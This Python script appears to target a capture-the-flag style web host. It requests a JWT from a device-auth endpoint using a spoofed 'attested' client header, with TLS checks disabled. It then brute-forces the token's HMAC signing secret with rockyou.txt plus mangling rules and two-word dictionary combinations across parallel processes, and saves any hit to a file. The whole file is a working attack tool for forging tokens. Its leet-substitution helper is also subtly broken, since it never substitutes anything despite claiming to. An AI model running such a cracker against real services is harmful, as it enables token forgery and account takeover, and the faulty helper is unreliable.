import base64, hashlib, hmac, itertools, json, os, ssl, urllib.request
from multiprocessing import Pool

BASE = "https://web-3f25599ac74e8a91.web.h7tex.com"
CTX = ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
r = urllib.request.Request(BASE+"/api/v1/auth/device", data=json.dumps({"device_id":"rules2"}).encode(),
                           method="POST", headers={"Content-Type":"application/json","X-Meridian-Client":"MeridianPay-Android/3.2.1 (attested)"})
with urllib.request.urlopen(r, context=CTX, timeout=15) as f:
    TOKEN = json.loads(f.read())["token"]
h0, p0, s0 = TOKEN.split(".")
SIGNING = (h0+"."+p0).encode()
SIG = base64.urlsafe_b64decode(s0+"="*(-len(s0)%4))

LEET_MAP = {b"a":b"4", b"A":b"4", b"e":b"3", b"E":b"3", b"i":b"1", b"I":b"1", b"o":b"0", b"O":b"0",
            b"s":b"$", b"S":b"$", b"t":b"7", b"T":b"7", b"g":b"9", b"l":b"1", b"L":b"1", b"b":b"8"}

def leet(w):
    out = bytearray()
    for i in range(0, len(w)-1, 2):
        pair = w[i:i+2]
        out += LEET_MAP.get(pair, pair)
    if len(w) % 2:
        out += w[-1:]
    return bytes(out)

def variants(w):
    yield w
    yield w.capitalize(); yield w.upper(); yield w.title(); yield w.swapcase()
    yield w[::-1]
    yield leet(w); yield leet(w).capitalize(); yield leet(w).upper()
    yield w+w
    for d in (b"0",b"1",b"2",b"3",b"5",b"7",b"9",b"12",b"13",b"23",b"69",b"99",b"00",b"01",b"123",b"2026",b"2025",b"2024",b"1!",b"!"):
        yield w+d; yield d+w
    for p in (b"!", b".", b"@", b"_", b"-", b"#", b"$"):
        yield w+p; yield p+w; yield w+p+p
    for s in (b"meridian", b"mp", b"pay", b"secret", b"key", b"jwt"):
        yield s+w; yield w+s; yield s+b"-"+w; yield w+b"-"+s

def crack(rng):
    a, b = rng
    new, sha, cd = hmac.new, hashlib.sha256, hmac.compare_digest
    with open("rockyou.txt", "rb") as f:
        f.seek(a)
        if a: f.readline()
        pos = f.tell()
        while pos < b:
            line = f.readline()
            if not line: break
            pos = f.tell()
            w = line.rstrip(b"\r\n")
            if not w: continue
            for k in variants(w):
                if cd(new(k, SIGNING, sha).digest(), SIG):
                    return k
    return None

def twoword(rng):
    a, b, WORDS2 = rng
    new, sha, cd = hmac.new, hashlib.sha256, hmac.compare_digest
    words = [w.strip().encode() for w in open("words_alpha.txt", encoding="utf-8", errors="ignore").readlines()[a:b] if 3 <= len(w.strip()) <= 12]
    for x in words:
        for y in WORDS2:
            for sep in (b"", b"-", b"_", b".", b" "):
                for k in (x+sep+y, y+sep+x):
                    if cd(new(k, SIGNING, sha).digest(), SIG):
                        return k
    return None

if __name__ == "__main__":
    N = 12
    SIZE = os.path.getsize("rockyou.txt")
    step = SIZE // N
    jobs = [(i*step, (i+1)*step if i < N-1 else SIZE) for i in range(N)]
    print("pass A: rockyou x full rule set (incl. leet)", flush=True)
    with Pool(N) as pool:
        hit = None
        for res in pool.imap_unordered(crack, jobs):
            if res: hit = res; pool.terminate(); break
    print("  hit:", hit, flush=True)
    if not hit:
        W = [w.strip().encode() for w in open("words_alpha.txt", encoding="utf-8", errors="ignore").readlines()[:4000] if 3 <= len(w.strip()) <= 12]
        WORDS2 = W
        total = len(W)
        chunk = max(1, total // N)
        jobs2 = [(i*chunk, min((i+1)*chunk, total), WORDS2) for i in range(N)]
        print("pass B: two-word combos", total, "x", len(WORDS2), flush=True)
        with Pool(N) as pool:
            for res in pool.imap_unordered(twoword, jobs2):
                if res: hit = res; pool.terminate(); break
        print("  hit:", hit, flush=True)
    if hit:
        open("jwt_secret.bin","wb").write(hit)
        print("SECRET:", hit)
